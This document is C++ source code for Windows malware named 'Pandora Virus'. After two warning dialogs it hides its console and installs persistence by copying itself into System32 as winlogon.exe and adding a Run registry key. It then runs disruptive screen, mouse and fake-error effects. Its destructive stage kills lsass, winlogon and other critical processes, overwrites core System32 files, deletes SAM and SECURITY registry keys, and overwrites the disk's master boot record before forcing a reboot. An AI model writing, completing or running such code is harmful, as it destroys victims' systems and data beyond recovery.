/**************************************************************************/
/***                                                                    ***/
/***                          Pandora Virus                             ***/
/***                   Copyright (C) 2025-2026 By 12.                   ***/
/***                                                                    ***/
/**************************************************************************/

#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <winuser.h>
#include <wingdi.h>
#include <cmath>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <vector>
#include <string>
#include <fstream>
#include <random>
#include <tlhelp32.h>
#include <winreg.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "advapi32.lib")

// ======================= UTILITY FUNCTIONS =======================
void HideConsole() {
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

void ShowMessage(const char* text, const char* title, UINT type) {
    MessageBoxA(nullptr, text, title, type);
}

// ======================= WARNINGS ================================
bool ConfirmWarning1() {
    int result = MessageBoxA(nullptr,
        "The software you are about to execute is considered malware.\n\n"
        "This malware will harm your computer and makes it unusable.\n"
        "If you are seeing this message, please click No to cancel the execution.\n"
        "If you still want to run the malware, click Yes.",
        "Pandora",
        MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2);
    return result == IDYES;
}

bool ConfirmWarning2() {
    int result = MessageBoxA(nullptr,
        "THIS IS THE LAST WARNING!\n\n"
        "THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\n"
        "STILL EXECUTE IT?",
        "Pandora",
        MB_YESNO | MB_ICONERROR | MB_DEFBUTTON2);
    return result == IDYES;
}

// ======================= PERSISTENCE =============================
void InstallPersistence() {
    char selfPath[MAX_PATH];
    GetModuleFileNameA(nullptr, selfPath, MAX_PATH);
    char destPath[MAX_PATH];
    GetSystemDirectoryA(destPath, MAX_PATH);
    strcat_s(destPath, "\\winlogon.exe");
    CopyFileA(selfPath, destPath, FALSE);

    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "Pandora", 0, REG_SZ, (BYTE*)destPath, strlen(destPath) + 1);
    RegCloseKey(hKey);
}

// ======================= STAGE 1 – ANNOYING EFFECTS ==============
void InvertDisplay() {
    HDC hdc = GetDC(nullptr);
    RECT rect;
    GetWindowRect(GetDesktopWindow(), &rect);
    BitBlt(hdc, 0, 0, rect.right, rect.bottom, hdc, 0, 0, NOTSRCCOPY);
    ReleaseDC(nullptr, hdc);
}

void TeleportMouse() {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    SetCursorPos(rand() % screenWidth, rand() % screenHeight);
}

void ShowRandomError() {
    const char* errors[] = {
        "Critical Error: Windows failed to start",
        "System32 corrupted – reinstall required",
        "Fatal exception 0xC0000005 occurred",
        "Not enough memory to continue",
        "Windows has encountered a problem and needs to close"
    };
    MessageBoxA(nullptr, errors[rand() % 5], "Error", MB_OK | MB_ICONERROR);
}

void DrawWithMouse() {
    static POINT lastPos = { 0,0 };
    POINT currentPos;
    GetCursorPos(&currentPos);
    if (lastPos.x != 0 && lastPos.y != 0) {
        HDC hdc = GetDC(nullptr);
        HPEN pen = CreatePen(PS_SOLID, 2, RGB(255, 0, 0));
        SelectObject(hdc, pen);
        MoveToEx(hdc, lastPos.x, lastPos.y, nullptr);
        LineTo(hdc, currentPos.x, currentPos.y);
        DeleteObject(pen);
        ReleaseDC(nullptr, hdc);
    }
    lastPos = currentPos;
}

// ======================= STAGE 2 – DEEP DESTRUCTION =============
void KillCriticalServices() {
    const char* services[] = {
        "winlogon.exe",
        "lsass.exe",
        "services.exe",
        "svchost.exe"
    };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    if (Process32First(snapshot, &pe)) {
        do {
            for (const char* target : services) {
                if (_stricmp(pe.szExeFile, target) == 0) {
                    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (hProc) {
                        TerminateProcess(hProc, 0);
                        CloseHandle(hProc);
                    }
                }
            }
        } while (Process32Next(snapshot, &pe));
    }
    CloseHandle(snapshot);
}

void CorruptSystemFiles() {
    const char* targets[] = {
        "C:\\Windows\\System32\\winlogon.exe",
        "C:\\Windows\\System32\\smss.exe",
        "C:\\Windows\\System32\\csrss.exe",
        "C:\\Windows\\System32\\lsass.exe",
        "C:\\Windows\\System32\\services.exe"
    };
    for (const char* path : targets) {
        HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, nullptr,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile != INVALID_HANDLE_VALUE) {
            char garbage[4096];
            DWORD written;
            WriteFile(hFile, garbage, sizeof(garbage), &written, nullptr);
            CloseHandle(hFile);
        }
    }
}

void NukeRegistry() {
    // Attempt to delete critical registry keys (may fail without admin)
    RegDeleteKeyA(HKEY_LOCAL_MACHINE, "SAM\\SAM");
    RegDeleteKeyA(HKEY_LOCAL_MACHINE, "SECURITY");
    RegDeleteKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
}

void OverwriteMBR() {
    HANDLE hDisk = CreateFileA(
        "\\\\.\\PhysicalDrive0",
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        OPEN_EXISTING,
        0,
        nullptr
    );
    if (hDisk == INVALID_HANDLE_VALUE) return;

    char garbage[512];
    for (int i = 0; i < 512; ++i)
        garbage[i] = rand() % 256;

    DWORD written;
    WriteFile(hDisk, garbage, 512, &written, nullptr);
    CloseHandle(hDisk);
}

// ======================= MAIN ====================================
int main() {
    // Seed random
    srand(static_cast<unsigned>(time(nullptr)));

    // Show two warnings and exit if declined
    if (!ConfirmWarning1() || !ConfirmWarning2())
        return 0;

    // Hide console so victim cannot easily close
    HideConsole();

    // Install persistence (run on every startup)
    InstallPersistence();

    // Launch annoying effects in background threads (forever)
    std::thread t1([]() {
        while (true) {
            InvertDisplay();
            Sleep(2000);
        }
        });
    std::thread t2([]() {
        while (true) {
            TeleportMouse();
            Sleep(50);
        }
        });
    std::thread t3([]() {
        while (true) {
            ShowRandomError();
            Sleep(rand() % 1000 + 1000); // 1–2 seconds
        }
        });
    std::thread t4([]() {
        while (true) {
            DrawWithMouse();
            Sleep(10);
        }
        });

    // Wait a bit before starting deep destruction (let the victim suffer)
    Sleep(30000); // 30 seconds

    // Launch deep destruction (this will eventually kill the system)
    KillCriticalServices();
    CorruptSystemFiles();
    NukeRegistry();
    OverwriteMBR();

    // Force restart
    system("shutdown /r /t 5 /c \"Your system has been destroyed.\"");

    // The program will likely crash before reaching here, but keep alive
    t1.join();
    t2.join();
    t3.join();
    t4.join();

    return 0;
}
